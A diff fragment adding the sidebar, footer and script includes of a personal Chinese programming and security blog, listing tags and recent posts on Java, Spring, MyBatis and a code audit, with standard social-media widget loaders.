href="/tags/安全服务/" style="font-size: 10px;">安全服务</a> <a href="/tags/工具分析/" style="font-size: 10px;">工具分析</a> <a href="/tags/序列化/" style="font-size: 10px;">序列化</a> <a href="/tags/报错注入/" style="font-size: 10px;">报错注入</a> <a href="/tags/漏洞复现/" style="font-size: 10px;">漏洞复现</a> <a href="/tags/生活记录/" style="font-size: 10px;">生活记录</a> <a href="/tags/端口转发/" style="font-size: 10px;">端口转发</a> <a href="/tags/脚本编写/" style="font-size: 10px;">脚本编写</a> <a href="/tags/部署上线/" style="font-size: 10px;">部署上线</a>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-recent-posts" class="widget-title">Recents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/03/20/Mybatis-3-learning-notes/">mybatis-3学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/02/Spring-5-learning-notes/">Spring5学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/18/An-audit-of-Java-Web-smbms/">记一次对JavaWeb-SMBMS的审计</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/18/Java-RMI-protocol-learning/">Java Rmi协议学习</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/13/Java-Dynamic-agent-mode/">Java动态代理模式</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+    不要因为走了太久而忘记当初为什么出发。
+    <br>
+    Copyrights &copy; 2022 shiyan All Rights Reserved. 
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_uv"> 
+    <a>「</a>本站访客数<span id="busuanzi_value_site_uv"></span>人次<a>」</a>
+    </span></div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/gossip" class="mobile-nav-link">Gossip</a>
+  
+    <a href="/yqlj" class="mobile-nav-link">Links</a>
+  
+</nav>
+
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/ja_JP/sdk.js#xfbml=1&version=v2.4";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+
+<script src="/js/script.js"></script>
+
+
+  </div>
+</body>
+</html>
